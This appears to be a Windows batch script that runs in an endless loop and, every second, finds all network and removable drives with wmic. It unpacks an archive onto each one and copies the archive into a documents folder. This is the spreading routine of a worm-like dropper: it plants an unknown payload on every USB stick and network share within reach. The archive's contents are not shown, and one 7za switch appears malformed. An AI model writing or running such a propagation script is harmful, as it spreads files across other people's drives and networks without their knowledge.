@echo off
:start
for /f "skip=2 delims=" %%i in (
  '2^>nul wmic logicaldisk get caption^,description^,drivetype /format:csv'
) do for /f "tokens=2-4 delims=," %%j in ("%%i") do (
  if %%l==4 (
7za.exe -aos x archive.7z -o%%j -password
xcopy /d archive.7z %%j\documents\
  )
)
for /f "skip=2 delims=" %%i in (
  '2^>nul wmic logicaldisk get caption^,description^,drivetype /format:csv'
) do for /f "tokens=2-4 delims=," %%j in ("%%i") do (
  if %%l==2 (
7za.exe -aos x archive.7z -o%%j -password
xcopy /d archive.7z %%j\documents\
  )
)
timeout 1
goto start